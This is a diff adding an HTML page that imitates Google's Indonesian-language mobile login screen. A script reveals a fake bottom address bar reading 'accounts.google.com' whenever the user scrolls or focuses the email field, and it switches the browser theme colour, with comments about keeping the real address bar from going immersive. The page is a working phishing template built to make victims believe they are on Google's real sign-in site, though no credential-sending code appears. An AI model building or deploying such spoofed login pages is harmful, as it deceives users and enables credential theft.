@@ -1,0 +1,219 @@
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login – Google</title>
+
+<!-- LIGHT theme color forces Chrome address bar to stay visible -->
+<meta name="theme-color" content="#f1f3f4" id="theme-color-meta">
+
+<style>
+* {
+  box-sizing: border-box;
+}
+
+body {
+  margin: 0;
+  font-family: Roboto, Arial, sans-serif;
+  background: #000;
+  color: #e8eaed;
+
+  /* KEY: prevent immersive fullscreen */
+  min-height: 120vh;
+  overflow-y: auto;
+}
+
+.container {
+  padding: 32px 24px 120px;
+}
+
+/* Google logo */
+.logo {
+  width: 40px;
+  margin-bottom: 24px;
+}
+
+/* Titles */
+h1 {
+  font-size: 32px;
+  font-weight: 400;
+  margin: 0 0 8px;
+}
+
+.subtitle {
+  font-size: 16px;
+  color: #bdc1c6;
+  margin-bottom: 32px;
+}
+
+/* Input */
+.field {
+  margin-bottom: 12px;
+}
+
+input {
+  width: 100%;
+  padding: 18px 16px;
+  font-size: 16px;
+  background: transparent;
+  color: #e8eaed;
+  border: 2px solid #8ab4f8;
+  border-radius: 4px;
+  outline: none;
+}
+
+input::placeholder {
+  color: #8ab4f8;
+}
+
+.link {
+  color: #8ab4f8;
+  font-size: 14px;
+  margin: 16px 0 32px;
+  display: inline-block;
+}
+
+/* Info text */
+.info {
+  font-size: 14px;
+  color: #bdc1c6;
+  line-height: 1.5;
+}
+
+.info a {
+  color: #8ab4f8;
+  text-decoration: none;
+}
+
+/* Bottom actions */
+.actions {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-top: 32px;
+}
+
+.actions a {
+  color: #8ab4f8;
+  font-size: 14px;
+  text-decoration: none;
+}
+
+button {
+  background: #8ab4f8;
+  color: #000;
+  border: none;
+  border-radius: 999px;
+  padding: 10px 20px;
+  font-size: 14px;
+}
+
+/* Footer */
+footer {
+  padding: 16px 24px;
+  font-size: 13px;
+  color: #9aa0a6;
+  display: flex;
+  justify-content: space-between;
+}
+
+/* Fake address bar */
+.fake-bar {
+  position: fixed;
+  bottom: 0;
+  width: 100%;
+  background: #121212;
+  border-top: 1px solid #303134;
+  text-align: center;
+  padding: 8px 0;
+  font-size: 14px;
+  color: #e8eaed;
+  z-index: 9999;
+  opacity: 0;
+  visibility: hidden;
+  transition: opacity .25s ease, visibility .25s ease, bottom .2s ease;
+}
+
+.fake-bar.show {
+  opacity: 1;
+  visibility: visible;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+  <img class="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">
+
+  <h1>Login</h1>
+  <div class="subtitle">Gunakan Akun Google Anda</div>
+
+  <div class="field">
+    <input id="myInput" type="text" placeholder="Email atau nomor telepon">
+  </div>
+
+  <div class="link">Lupa email?</div>
+
+  <div class="info">
+    Bukan Handphone Anda? Gunakan jendela Penjelajahan Rahasia untuk login.
+    <a href="#">Pelajari lebih lanjut cara menggunakan Mode tamu</a>
+  </div>
+
+  <div class="actions">
+    <a href="#">Buat akun</a>
+    <button>Selanjutnya</button>
+  </div>
+</div>
+
+<footer>
+  <div>America ▼</div>
+  <div>Bantuan · Privasi · Persyaratan</div>
+</footer>
+
+<div class="fake-bar" id="fakeBar">accounts.google.com</div>
+
+<script>
+    const input = document.getElementById("myInput");
+    const fakeBar = document.getElementById("fakeBar");
+    const metaTheme = document.getElementById("theme-color-meta");
+    
+    let lastScroll = 0;
+    
+    function changeTabColor(color) {
+      metaTheme.setAttribute("content", color);
+    }
+    
+    
+    window.addEventListener("scroll", () => {
+      const currentScroll = window.scrollY;
+    
+      if (currentScroll > lastScroll) {
+        
+        changeTabColor("#ffffff");
+        fakeBar.classList.add("show");
+      } else {
+        
+        fakeBar.classList.remove("show");
+        changeTabColor("#f1f3f4");
+      }
+    
+      lastScroll = currentScroll;
+    });
+    
+   
+    input.addEventListener("focus", () => {
+      changeTabColor("#ffffff");
+      fakeBar.classList.add("show");
+    });
+    
+    input.addEventListener("blur", () => {
+      fakeBar.classList.remove("show");
+      changeTabColor("#f1f3f4");
+    });
+    </script>
+    
+
+</body>
+</html>
